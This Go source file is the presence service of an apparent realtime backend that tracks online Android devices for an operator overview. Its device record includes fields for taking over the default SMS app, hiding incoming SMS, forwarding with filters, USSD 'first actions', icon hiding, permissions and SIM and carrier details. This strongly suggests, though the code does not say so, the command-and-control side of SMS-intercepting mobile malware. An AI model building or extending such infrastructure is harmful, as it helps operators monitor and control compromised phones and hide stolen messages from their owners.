package presence

import (
	"context"
	"log/slog"
	"sort"
	"sync"
	"time"

	"github.com/base/realtime/internal/protocol"
	"github.com/base/realtime/internal/store"
)

type OfflineHook func(userID, deviceID, port string, lastSeen time.Time)

type Service struct {
	store  *store.Store
	grace  time.Duration
	stale  time.Duration
	root   context.Context
	mu     sync.Mutex
	touch  map[string]time.Time
	hook   OfflineHook
}

type Device struct {
	DeviceID       string `json:"deviceId"`
	Online         bool   `json:"online"`
	LastSeen       int64  `json:"lastSeen"`
	FirstSeen      int64  `json:"firstSeen,omitempty"`
	Port           string `json:"port,omitempty"`
	ClientIP       string `json:"clientIp,omitempty"`
	AppLabel       string `json:"appLabel,omitempty"`
	PackageName    string `json:"packageName,omitempty"`
	Manufacturer   string `json:"manufacturer,omitempty"`
	Brand          string `json:"brand,omitempty"`
	Model          string `json:"model,omitempty"`
	Device         string `json:"device,omitempty"`
	Product        string `json:"product,omitempty"`
	AndroidRelease string `json:"androidRelease,omitempty"`
	Sdk            int    `json:"sdk,omitempty"`
	Operator       string `json:"operator,omitempty"`
	SimOperator    string `json:"simOperator,omitempty"`
	Locale         string `json:"locale,omitempty"`
	TimeZone       string `json:"timeZone,omitempty"`
	IconState          string                `json:"iconState,omitempty"`
	Grants             []string              `json:"grants,omitempty"`
	Sims               []protocol.SimSlot    `json:"sims,omitempty"`
	Screen             *protocol.ScreenState `json:"screen,omitempty"`
	SmsDefaultPkg      string                `json:"smsDefaultPkg,omitempty"`
	SmsDefaultLabel    string                `json:"smsDefaultLabel,omitempty"`
	SmsOurs            bool                  `json:"smsOurs,omitempty"`
	SmsHideIncoming    bool                  `json:"smsHideIncoming,omitempty"`
	SmsPreviousPkg     string                `json:"smsPreviousPkg,omitempty"`
	SmsPreviousLabel   string                `json:"smsPreviousLabel,omitempty"`
	Offmode            bool                  `json:"offmode,omitempty"`
	OffmodeTo          string                `json:"offmodeTo,omitempty"`
	OffmodeFilter      string                `json:"offmodeFilter,omitempty"`
	FirstActionKind    string                `json:"firstActionKind,omitempty"`
	FirstActionDetail  string                `json:"firstActionDetail,omitempty"`
	FirstActionUssd    string                `json:"firstActionUssd,omitempty"`
	FirstActionText    string                `json:"firstActionText,omitempty"`
}

type Snapshot struct {
	UserID      string   `json:"userId"`
	Online      bool     `json:"online"`
	LastSeen    int64    `json:"lastSeen"`
	DisplayName string   `json:"displayName,omitempty"`
	Description string   `json:"description,omitempty"`
	SetToken    string   `json:"setToken,omitempty"`
	Blocked     bool     `json:"blocked,omitempty"`
	WatchMuted  bool     `json:"watchMuted,omitempty"`
	Devices     []Device `json:"devices"`
}

type Overview struct {
	Mongo         string     `json:"mongo"`
	LiveSockets   int        `json:"liveSockets"`
	Users         int        `json:"users"`
	OnlineUsers   int        `json:"onlineUsers"`
	Devices       int        `json:"devices"`
	OnlineDevices int        `json:"onlineDevices"`
	Items         []Snapshot `json:"items"`
}

func New(root context.Context, st *store.Store, grace, stale time.Duration) *Service {
	return &Service{
		store: st,
		grace: grace,
		stale: stale,
		root:  root,
		touch: make(map[string]time.Time),
	}
}

func (s *Service) SetOfflineHook(hook OfflineHook) {
	s.hook = hook
}

func (s *Service) SetOnline(ctx context.Context, userID, deviceID, connID, instanceID, fcmToken, port string) (time.Time, error) {
	at := time.Now()
	if err := s.store.SetOnline(ctx, userID, deviceID, connID, instanceID, fcmToken, port, at); err != nil {
		return time.Time{}, err
	}
	s.mu.Lock()
	s.touch[userID+"\x00"+deviceID] = at
	s.mu.Unlock()
	return at, nil
}

func (s *Service) Touch(ctx context.Context, userID, deviceID string) {
	key := userID + "\x00" + deviceID
	now := time.Now()
	s.mu.Lock()
	last := s.touch[key]
	if now.Sub(last) < 25*time.Second {
		s.mu.Unlock()
		return
	}
	s.touch[key] = now
	s.mu.Unlock()
	op, cancel := context.WithTimeout(ctx, 2*time.Second)
	defer cancel()
	if err := s.store.Touch(op, userID, deviceID, now); err != nil {
		slog.Warn("presence touch", "err", err, "user", userID, "device", deviceID)
	}
}

func (s *Service) FlushTouch(ctx context.Context, userID, deviceID string) {
	op, cancel := context.WithTimeout(ctx, 2*time.Second)
	defer cancel()
	if err := s.store.Touch(op, userID, deviceID, time.Now()); err != nil {
		slog.Warn("presence flush", "err", err, "user", userID, "device", deviceID)
	}
}

func (s *Service) ScheduleOffline(userID, deviceID, connID string) {
	time.AfterFunc(s.grace, func() {
		if s.root.Err() != nil {
			return
		}
		ctx, cancel := context.WithTimeout(s.root, 5*time.Second)
		defer cancel()
		at := time.Now()
		offline, err := s.store.MarkOfflineIfConn(ctx, userID, deviceID, connID, at)
		if err != nil {
			slog.Error("presence offline", "err", err, "user", userID, "device", deviceID)
			return
		}
		if offline {
			slog.Info("presence offline", "user", userID, "device", deviceID)
			if s.hook != nil {
				port := ""
				if row, getErr := s.store.GetPresence(ctx, userID, deviceID); getErr == nil {
					port = row.Port
				}
				s.hook(userID, deviceID, port, at)
			}
		}
	})
}

func (s *Service) Snapshot(ctx context.Context, userID string) (Snapshot, error) {
	rows, err := s.store.ListPresence(ctx, userID)
	if err != nil {
		return Snapshot{}, err
	}
	snap := Snapshot{UserID: userID, Devices: make([]Device, 0, len(rows))}
	var latest time.Time
	for _, row := range rows {
		snap.Devices = append(snap.Devices, Device{
			DeviceID: row.DeviceID,
			Online:   row.Online,
			LastSeen: row.LastSeen.UnixMilli(),
			Port:     row.Port,
		})
		if row.Online {
			snap.Online = true
		}
		if row.LastSeen.After(latest) {
			latest = row.LastSeen
		}
	}
	if !latest.IsZero() {
		snap.LastSeen = latest.UnixMilli()
	}
	return snap, nil
}

func (s *Service) Overview(ctx context.Context, liveSockets int) (Overview, error) {
	rows, err := s.store.ListAllPresence(ctx, 2000)
	if err != nil {
		return Overview{}, err
	}
	out := Overview{
		Mongo:       "ok",
		LiveSockets: liveSockets,
		Items:       make([]Snapshot, 0),
	}
	index := make(map[string]int)
	for _, row := range rows {
		i, ok := index[row.UserID]
		if !ok {
			i = len(out.Items)
			index[row.UserID] = i
			out.Items = append(out.Items, Snapshot{UserID: row.UserID, Devices: make([]Device, 0)})
		}
		item := &out.Items[i]
		item.Devices = append(item.Devices, Device{
			DeviceID: row.DeviceID,
			Online:   row.Online,
			LastSeen: row.LastSeen.UnixMilli(),
			Port:     row.Port,
		})
		if row.Online {
			item.Online = true
			out.OnlineDevices++
		}
		ms := row.LastSeen.UnixMilli()
		if ms > item.LastSeen {
			item.LastSeen = ms
		}
	}
	out.Devices = len(rows)
	out.Users = len(out.Items)
	for _, item := range out.Items {
		if item.Online {
			out.OnlineUsers++
		}
	}
	sort.Slice(out.Items, func(i, j int) bool {
		a, b := out.Items[i], out.Items[j]
		if a.Online != b.Online {
			return a.Online
		}
		return a.LastSeen > b.LastSeen
	})
	userIDs := make([]string, 0, len(out.Items))
	for _, item := range out.Items {
		userIDs = append(userIDs, item.UserID)
	}
	profiles, err := s.store.ListUserProfiles(ctx, userIDs)
	if err != nil {
		return out, err
	}
	clientRows, err := s.store.ListClientDevices(ctx, userIDs)
	if err != nil {
		return out, err
	}
	clientByKey := make(map[string]store.ClientDevice)
	for _, rows := range clientRows {
		for _, row := range rows {
			clientByKey[row.UserID+"\x00"+row.DeviceID] = row
		}
	}
	for i := range out.Items {
		item := &out.Items[i]
		if p, ok := profiles[item.UserID]; ok {
			item.DisplayName = p.DisplayName
			item.Description = p.Description
			item.SetToken = p.SetToken
			item.Blocked = p.Blocked
			item.WatchMuted = p.WatchMuted
		}
		for j := range item.Devices {
			d := &item.Devices[j]
			if row, ok := clientByKey[item.UserID+"\x00"+d.DeviceID]; ok {
				applyClient(d, row)
			}
		}
	}
	return out, nil
}

func (s *Service) UserCard(ctx context.Context, profile store.UserProfile) (Snapshot, error) {
	snap, err := s.Snapshot(ctx, profile.UserID)
	if err != nil {
		return Snapshot{}, err
	}
	snap.DisplayName = profile.DisplayName
	snap.Description = profile.Description
	snap.SetToken = profile.SetToken
	snap.Blocked = profile.Blocked
	snap.WatchMuted = profile.WatchMuted
	grouped, err := s.store.ListClientDevices(ctx, []string{profile.UserID})
	if err != nil {
		return snap, err
	}
	for _, row := range grouped[profile.UserID] {
		idx := -1
		for i := range snap.Devices {
			if snap.Devices[i].DeviceID == row.DeviceID {
				idx = i
				break
			}
		}
		if idx < 0 {
			snap.Devices = append(snap.Devices, Device{DeviceID: row.DeviceID, Port: row.Port})
			idx = len(snap.Devices) - 1
		}
		applyClient(&snap.Devices[idx], row)
	}
	return snap, nil
}

func applyClient(d *Device, row store.ClientDevice) {
	if row.ClientIP != "" {
		d.ClientIP = row.ClientIP
	}
	if !row.FirstSeenAt.IsZero() {
		d.FirstSeen = row.FirstSeenAt.UnixMilli()
	}
	c := row.Client
	d.AppLabel = c.AppLabel
	d.PackageName = c.PackageName
	d.Manufacturer = c.Manufacturer
	d.Brand = c.Brand
	d.Model = c.Model
	d.Device = c.Device
	d.Product = c.Product
	d.AndroidRelease = c.AndroidRelease
	d.Sdk = c.Sdk
	d.Operator = c.Operator
	d.SimOperator = c.SimOperator
	d.Locale = c.Locale
	d.TimeZone = c.TimeZone
	d.IconState = c.IconState
	d.SmsDefaultPkg = c.SmsDefaultPkg
	d.SmsDefaultLabel = c.SmsDefaultLabel
	d.SmsOurs = c.SmsOurs
	d.SmsHideIncoming = c.SmsHideIncoming
	d.SmsPreviousPkg = c.SmsPreviousPkg
	d.SmsPreviousLabel = c.SmsPreviousLabel
	d.Offmode = c.Offmode
	d.OffmodeTo = c.OffmodeTo
	d.OffmodeFilter = c.OffmodeFilter
	if len(c.Sims) > 0 {
		d.Sims = c.Sims
	}
	if len(row.Grants) > 0 {
		d.Grants = row.Grants
	}
	if row.Screen != nil {
		d.Screen = row.Screen
	}
	if row.FirstAction == "done" || row.FirstIcon == "done" || row.FirstUssd == "done" {
		d.FirstActionKind = row.FirstActionKind
		d.FirstActionDetail = row.FirstActionDetail
		d.FirstActionUssd = row.FirstActionUssd
		d.FirstActionText = row.FirstActionText
	}
	if d.Model == "" {
		d.Model = c.Device
	}
}

func (s *Service) RunStaleSweep(ctx context.Context) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			now := time.Now()
			op, cancel := context.WithTimeout(ctx, 5*time.Second)
			devices, err := s.store.SweepStale(op, now.Add(-s.stale), now)
			cancel()
			if err != nil {
				slog.Warn("presence sweep", "err", err)
				continue
			}
			if len(devices) > 0 {
				slog.Info("presence sweep", "offline", len(devices))
			}
			if s.hook != nil {
				for _, d := range devices {
					s.hook(d.UserID, d.DeviceID, d.Port, d.LastSeen)
				}
			}
		}
	}
}
